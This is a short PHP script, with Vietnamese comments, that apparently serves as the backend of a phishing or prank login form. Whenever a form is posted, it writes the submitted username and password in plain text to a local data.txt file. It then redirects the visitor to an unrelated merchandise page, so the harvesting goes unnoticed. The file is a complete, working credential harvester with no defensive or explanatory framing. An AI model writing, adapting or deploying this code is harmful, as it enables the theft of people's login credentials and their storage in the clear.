<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Mở tệp và ghi thông tin tài khoản, mật khẩu
    $file = fopen("data.txt", "a");
    fwrite($file, "Username: $username, Password: $password\n");
    fclose($file);

    // Chuyển hướng đến trang đích
    header("Location: https://youtooz.com/products/troll-face");
    exit();
}
?>
